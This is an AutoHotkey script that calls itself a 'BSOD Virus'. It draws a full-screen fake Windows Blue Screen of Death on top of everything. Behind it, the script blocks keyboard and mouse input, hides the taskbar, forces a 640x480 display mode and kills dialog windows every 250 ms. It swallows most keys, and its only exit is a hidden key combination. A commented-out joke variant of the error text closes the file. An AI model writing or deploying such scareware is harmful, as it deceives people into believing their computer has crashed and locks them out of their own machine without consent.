/*
  BSOD Virus

  Author(s):-     pSych0 C0d3r		 
  Contact:-  pSych0.C0d3r@gmail.com  

  Description:- 
	Shows a nice little Blue Screen of Death
*/

#NoEnv	
#SingleInstance Force
#Persistent
#NoTrayIcon

SetBatchLines -1 	;For Speed

;Gui Variables
Width	:=	A_ScreenWidth + 10
Height	:=	A_ScreenHeight + 10

;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Code Begins

MouseMove, %Width%, %Height%
BlockInput, On
WinHide, ahk_class Shell_TrayWnd

;tpm Display Settings
VarSetCapacity(devmode,152,0)
, NumPut(152,devmode,36,"ushort")
, NumPut(0x180000,devmode,40)
, NumPut(480,NumPut(640,devmode,108))
, DllCall("ChangeDisplaySettings","uint",&devmode,"uint",0x4)

;The Text To Show
RealText = 
(
A problem has been detected and Windows has been shut down to prevent damage to your computer.

The problem seems to be caused by the following file: FILENAME

PAGE_FAULT_IN_NONPAGED_AREA

If this is the first time you've seen this Stop error screen, restart your computer.

If this screen appears again, follow these steps:

Check to make sure any new hardware or software is properly installed.
If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.

If problems continue, disable or remove any newly installed hardware or software. 
Disable BIOS memory options such as caching or shadowing.
If you need to use Safe Mode to remove or disable components, restart your comuter, press F8 to select Advanced Startup Options, and then select Safe Mode.

Technical information:

*** STOP: 0x00000050 (0xFD3094C2, 0x00000001, 0xFBFE7617, 0x00000000)

*** FILENAME - Address FBFE7617 base at FBFE5000, DateStamp 3d6dd67c
)

;Create A GUI
Gui, -SysMenu +AlwaysOnTop -Caption

Gui, Font, s10, Lucida Console
Gui, Color, 0x00006f
Gui, Add, Text, % "w" A_ScreenWidth-20 " h" A_ScreenHeight " cWhite", % RegExReplace(RealText,"FILENAME","SPCDMON.SYS")

Gui, Show, y0 w%Width% h%Height%, BSOD

SetTimer, Check, 250

Return	 ;End of Auto Execute Section
;_____________________________________________

q & m::
   WinShow, ahk_class Shell_TrayWnd
   BlockInput, MouseMoveOff
Exitapp

Check:
	IfWinExist ahk_class #32770
	{
		WinKill, ahk_class #32770
		WinSet, AlwaysOnTop, On, BSOD
		BlockInput, On
	}
Return

;Lock Keys
*A::
*B::
*C::
*D::
*E::
*F::
*G::
*H::
*I::
*J::
*K::
*L::
*N::
*O::
*P::
*R::
*S::
*T::
*U::
*V::
*W::
*X::
*Y::
*Z::

;Mouse Buttons
*LButton::
*MButton::
*RButton::

*Esc::
*Tab::

*Alt::
*LWin::
*RWin::

*Up::
*Down::
*Left::
*Right::

*Space::

*F1::
*F2::
*F3::
*F4::
*F5::
*F6::
*F7::
*F8::
*F9::
*F10::
*F11::
*F12::
Return

/*
FunnyText = 
(
A problem has been detected and User Interface has been shut down to prevent damage to your computer.

The problem seems to be caused by the following file: NAME.USER

PAGE_FAULT_IN_USER_AREA

If this is the first time you've seen this Stop error screen, restart your computer and read the provided manual carefully over again.
If this screen appears again, you obviously have done something wrong.

Check to make sure any new hardware or software is properly installed. If this is a new installation, ask you hardware or software manufacturer for any Skill updates you might need.

If problems continue, disable or remove any newly installed hardware, such as a new chair, software or lamp. Enable your brain or Software for use and ask for an update where applicable.
If you need to use SafeMode to remove or disable components, restart this procedure, press ESC to select Advanced Exit Options of this programm and then turn off your computer.


Technical information:

*** STOP 0x0BADF00D (0x00133700, 0x00C0DE00, 0x0BADF00D, 0x00000000)

*** NAME.USER - Address FA57C0DE base at 00000000, DateStamp 00H0AX0)
*/